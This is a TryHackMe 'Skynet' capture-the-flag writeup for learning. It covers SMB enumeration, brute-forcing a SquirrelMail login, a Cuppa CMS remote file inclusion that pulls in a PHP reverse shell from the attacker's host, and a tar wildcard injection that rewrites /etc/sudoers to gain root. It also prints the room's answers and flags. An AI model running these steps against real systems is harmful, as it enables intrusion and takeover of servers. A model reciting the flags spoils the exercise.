# Skynet – Writeup
# Welcome!

- YØ! I tackled **Skynet** on TryHackMe ([link here](https://tryhackme.com/room/skynet)), which was a **easy difficulty challenge**. This one's all about enumeration, SMB shares, email snooping, exploiting a CMS vulnerability, and some good old privilege escalation with a tar wildcard injection.

As always, I'll walk you through my process, the tools I used, and yeah... the rookie mistakes I made along the way (because let's be real, we all make them). Hope this helps someone out there!

<p align="center">
  <img src="../../assets/rooms/Skynet/0.png" alt="COVER" />
</p>

## Initial Reconnaissance


Time to get our hands dirty. First things first, I visited the target IP to see what we're dealing with. A simple webpage greeted me, nothing too exciting on the surface.

![IMAGE](../../assets/rooms/Skynet/1.png)

### Nmap Scan

Let's see what ports are open:

```bash
nmap -Pn -sV 10.10.24.11
```

![IMAGE](../../assets/rooms/Skynet/2.png)

A bunch of ports open! Smb, pop3 and imap seem interesting!

---

## Directory Enumeration

With multiple services running, I decided to enumerate the web directories first using Dirbuster.

After running Dirbuster, I found something interesting: **SquirrelMail**! That's a webmail client. Could be useful later.

![IMAGE](../../assets/rooms/Skynet/2.5.png)
![IMAGE](../../assets/rooms/Skynet/2.6.png)
![IMAGE](../../assets/rooms/Skynet/2.7.png)

I tried some basic SQL injection attempts on the login page... and failed miserably. Time to pivot.

---


## SMB Enumeration (LET'S SAMBAR!)

After those failed SQLi attempts, I remembered there was SMB running. Time to enumerate those shares!


I used `smbclient` to list available shares:

```bash
smbclient -L //10.10.24.11 -N
```

![IMAGE](../../assets/rooms/Skynet/3.png)

I couldn't acess the other shares without being logged in, but...

![IMAGE](../../assets/rooms/Skynet/4.png)

- **Bingo!** I could access the **anonymous** share without credentials. Let's see what treasures are inside.

```bash
smbclient //10.10.24.11/anonymous -N
```

![IMAGE](../../assets/rooms/Skynet/5.png)

I grabbed everything I could:
- `attention.txt` – Just a warning message

![IMAGE](../../assets/rooms/Skynet/6.png)

- `log1.txt` – Looks like a wordlist!

![IMAGE](../../assets/rooms/Skynet/7.png)

- `log2.txt` – Empty
- `log3.txt` – Also empty


### Time to organize our findings.

From the SMB enumeration, we noticed there's a user called **miles** and a share named **milesdyson**. So we potentially have two usernames and a nice password list from `log1.txt`.

---

## Brute Force SquirrelMail

With a username and a wordlist, it's time to brute force that SquirrelMail login!

I recently created a simple login/password brute force script (available in my GitHub "ctfTools" folder if you're interested). I created a `users.txt` file with potential usernames:
- milesdyson
- miles

And used `log1.txt` as the password list.

![IMAGE](../../assets/rooms/Skynet/8.png)

**Success!** Got the credentials:

**Username:** `milesdyson`  
**Password:** `cyborg007haloterminator`

**Question:** What is Miles password for his emails?

**Answer:** `cyborg007haloterminator`

---

## Reading Miles' Emails

Now let's log into SquirrelMail and see what Miles has been up to.

Logged in successfully! Time to snoop through some emails.

![IMAGE](../../assets/rooms/Skynet/9.png)

### First email:

Some casual but weird stuff 

![IMAGE](../../assets/rooms/Skynet/10.png)

### Second email: 
Contains binary! Ran it through CyberChef real quick... Doesn't seem to be anything useful, but I'll keep note of it just in case.  

![IMAGE](../../assets/rooms/Skynet/11.png)

![IMAGE](../../assets/rooms/Skynet/12.png)

### Third email: 
Hold up... this looks like another password!

![IMAGE](../../assets/rooms/Skynet/13.png)

**New password found!** 
Let's try accessing the SMB share with Miles' credentials now.

```bash
smbclient //10.10.24.11/milesdyson -U milesdyson
```

![IMAGE](../../assets/rooms/Skynet/14.png)

**Bingo!** We're in. I can see more directories now. The "notes" folder looks interesting while the rest seems like work-related content.

![IMAGE](../../assets/rooms/Skynet/15.png)

Inside the notes folder, there's a file called `important.txt`. That HAS to be important, right?

![IMAGE](../../assets/rooms/Skynet/16.png)
![IMAGE](../../assets/rooms/Skynet/17.png)
![IMAGE](../../assets/rooms/Skynet/18.png)

**Found it!** A hidden directory: `/45kra24zxs28v3yd`

**Question:** What is the hidden directory?

**Answer:** `/45kra24zxs28v3yd`

---

## The Hidden CMS (ROOKIE MISTAKE TIME!)

**Description:**
Let's visit that hidden directory and see what Miles is hiding.

**Explanation:**
Navigating to `http://10.10.24.11/45kra24zxs28v3yd/` shows a simple webpage. Nothing crazy here. I can see a `miles.jpg` in the source code, but not much else.

![IMAGE](../../assets/rooms/Skynet/19.png)
![IMAGE](../../assets/rooms/Skynet/20.png)

The next TryHackMe question is:

**Question:** What is the vulnerability called when you can include a remote file for malicious purposes?

**Answer:** `remote file inclusion`

Hmm, this must be about RFI. I went back to SquirrelMail thinking I could upload files there... nope, doesn't work like that.

![IMAGE](../../assets/rooms/Skynet/21.png)


After some head-scratching, I realized: **I MADE A ROOKIE MISTAKE!**

**I DIDN'T ENUMERATE THE HIDDEN DIRECTORY!**

Time to fix that:

```bash
gobuster dir -u http://10.10.24.11/45kra24zxs28v3yd/ -w wordlists/common.txt -t 30 -x php,html,txt -o gobuster_dir.txt
```

Even before the scan finished:

![IMAGE](../../assets/rooms/Skynet/22.png)

**Found it:** `http://10.10.24.11/45kra24zxs28v3yd/administrator/`

**Cuppa CMS!** SO THIS IS WHAT THEY WERE REFERRING TO!

![IMAGE](../../assets/rooms/Skynet/23.png)

---

## Exploiting Cuppa CMS

Now we have a CMS to exploit. Let's see what vulnerabilities exist for Cuppa CMS.

First, I tried the basics:
- Default credentials? Nope.
- SquirrelMail credentials? Nada.
- SQL injection? Also no.

Time to consult Google:

**Search:** "cuppa cms remote file inclusion"

![IMAGE](../../assets/rooms/Skynet/23.5.png)

**Found it:** [https://www.exploit-db.com/exploits/25971](https://www.exploit-db.com/exploits/25971)

The exploit shows we can view system files through a URL parameter. Let's test it:

```
http://10.10.24.11/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```

![IMAGE](../../assets/rooms/Skynet/24.png)

**Incredible.** We can read `/etc/passwd`!

The exploit mentions we can achieve full server compromise. That's exactly what we want. The plan:
1. Host a PHP reverse shell on our machine
2. Make the vulnerable URL fetch our reverse shell
3. Profit!

Download the reverse shell from pentestmonkey and modify the IP and port:

[https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

![IMAGE](../../assets/rooms/Skynet/28.5.png)

Start a PHP server to host our reverse shell:

```bash
php -S 0.0.0.0:8000
```

![IMAGE](../../assets/rooms/Skynet/28.png)

Start a netcat listener in another terminal:

```bash
ncat -lvnp 1337
```

![IMAGE](../../assets/rooms/Skynet/28.7.png)

Now trigger the exploit:

```
http://10.10.24.11/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://YOUR_IP:8000/revshell.php
```

![IMAGE](../../assets/rooms/Skynet/29.png)

**WE'RE IN!**

Stabilize the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![IMAGE](../../assets/rooms/Skynet/30.png)

---

## User Flag

Time to grab that user flag!

Navigate to Miles' home directory:

```bash
cd /home/milesdyson
cat user.txt
```

![IMAGE](../../assets/rooms/Skynet/31.png)

**Question:** What is the user flag?

**Answer:** `7ce5c2109a40f958099283600a9ae807`

---

## Privilege Escalation (Tar Wildcard Injection)

Now for the fun part: getting root!

After poking around the filesystem, I found a `backup` folder in Miles' home directory with a `backup.sh` script.

![IMAGE](../../assets/rooms/Skynet/32.png)

The backup script is... literally just a backup. But what kind of Linux user doesn't automate their backups? Nobody does manual backups.

**Let's check the crontabs!**

```bash
cat /etc/crontab
```

![IMAGE](../../assets/rooms/Skynet/33.png)

---
#### mdadm

![IMAGE](../../assets/rooms/Skynet/34.png)

---
#### php

![IMAGE](../../assets/rooms/Skynet/35.png)

---
#### popularity-contest

![IMAGE](../../assets/rooms/Skynet/36.png)

---


The last entry looks interesting! The backup script runs as root every minute using `tar`.

**Time to abuse tar wildcard injection!**

First, move to `/var/www/html` where we have proper human permissions:

```bash
cd /var/www/html
```

Create our malicious script:

```bash
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > binhoberde.sh
```

This creates a script that will give `www-data` sudo privileges without a password.

Now create the wildcard files that tar will interpret as command-line options:

```bash
echo "/var/www/html" > "--checkpoint-action=exec=sh binhoberde.sh"
echo "/var/www/html" > --checkpoint=1
```

These filenames literally mimic tar options. When tar processes wildcards, it will execute our script!

**Wait one minute...** (literally, the cronjob runs every minute)

<p align="left">
  <img src="../../assets/vault/wewillberightback.png" alt="wewillberightback" width="100"/>
</p

Check if we have sudo:

```bash
sudo -l
```

![IMAGE](../../assets/rooms/Skynet/37.png)

**YES!** Now get root:

```bash
sudo su
```

![IMAGE](../../assets/rooms/Skynet/38.png)

Navigate to root's home directory:

```bash
cd /root
cat root.txt
```

![IMAGE](../../assets/rooms/Skynet/39.png)

**Question:** What is the root flag?

**Answer:** `3f0372db24753accc7179a282cd6a949`

---

# Goodbye!

And that's a wrap! This challenge was a great test of enumeration, exploitation, and privilege escalation. The tar wildcard injection was definitely the highlight.

Remember: Always enumerate EVERYTHING (don't be like me and forget directories).

Until next time and keep hacking!

<p align="center">
  <img src="../../assets/vault/edward.png" alt="Edward" width="400"/>
</p
